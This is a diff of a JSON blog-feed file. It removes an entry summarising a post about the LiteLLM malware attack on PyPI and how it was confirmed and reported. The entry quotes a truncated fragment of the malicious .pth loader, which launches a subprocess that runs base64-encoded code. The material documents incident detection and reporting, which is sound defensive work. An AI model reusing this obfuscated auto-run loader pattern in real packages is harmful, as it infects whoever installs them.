@@ -400,27 +400,6 @@
       "_signal_feed_url": "http://simonwillison.net/"
     },
     {
-      "id": "d51b0f10bfc39143",
-      "url": "https://simonwillison.net/2026/Mar/26/response-to-the-litellm-malware-attack/#atom-everything",
-      "title": "My minute-by-minute response to the LiteLLM malware attack",
-      "summary": "\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://futuresearch.ai/blog/litellm-attack-transcript/\"\u003eMy minute-by-minute response to the LiteLLM malware attack\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\nCallum McMahon reported the \u003ca href=\"https://simonwillison.net/2026/Mar/24/malicious-litellm/\"\u003eLiteLLM malware attack\u003c/a\u003e to PyPI. Here he shares the Claude transcripts he used to help him confirm the vulnerability and decide what to do about it. Claude even suggested the PyPI security contact address after confirming the malicious code in a Docker container:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003eConfirmed\u003c/strong\u003e. Fresh download from PyPI right now in an isolated Docker container:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eInspecting: litellm-1.82.8-py3-none-any.whl\nFOUND: litellm_init.pth\nSIZE: 34628 bytes\nFIRST 200 CHARS:\nimport os, subprocess, sys; subprocess.Popen([sys.executable, \"-c\", \"import base64; exec(base64.b64decode('aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRlbXBmaWxl...\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe malicious \u003ccode\u003elitellm==1.82.8\u003c/code\u003e is \u003cstrong\u003elive on PyPI right now\u003c/strong\u003e and anyone installing or upgrading litellm will be infected. This needs to be reported to security@pypi.org immediately.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eI was chuffed to see Callum use my \u003ca href=\"https://github.com/simonw/claude-code-transcripts\"\u003eclaude-code-transcripts\u003c/a\u003e tool to publish the transcript of the conversation.\n\n    \u003cp\u003e\u003csmall\u003e\u003c/small\u003eVia \u003ca href=\"https://news.ycombinator.com/item?id=47531967\"\u003eHacker News\u003c/a\u003e\u003c/small\u003e\u003c/p\u003e\n\n\n    \u003cp\u003eTags: \u003ca href=\"https://simonwillison.net/tags/pypi\"\u003epypi\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/security\"\u003esecurity\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/ai\"\u003eai\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/generative-ai\"\u003egenerative-ai\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/llms\"\u003ellms\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/claude\"\u003eclaude\u003c/a\u003e, \u003ca href=\"https://simonwillison.net/tags/supply-chain\"\u003esupply-chain\u003c/a\u003e\u003c/p\u003e",
-      "date_published": "2026-03-26T23:58:22Z",
-      "tags": [
-        "AI",
-        "LLM",
-        "Python",
-        "Open Source",
-        "pypi",
-        "security",
-        "generative-ai",
-        "llms",
-        "claude",
-        "supply-chain"
-      ],
-      "_signal_feed_title": "Simon Willison's Weblog",
-      "_signal_feed_url": "http://simonwillison.net/"
-    },
-    {
       "id": "7c575ebe30cbed0a",
       "url": "https://siddhantkhare.com/writing/ambition-tax",
       "title": "The ambition tax",
@@ -514,6 +493,6 @@
       "_signal_feed_url": "https://medium.com/@steve-yegge?source=rss-c1ec701babb7------2"
     }
   ],
-  "_signal_generated": "2026-04-02T18:53:27Z",
+  "_signal_generated": "2026-04-03T02:02:58Z",
   "_signal_period": "2026-03"
 }
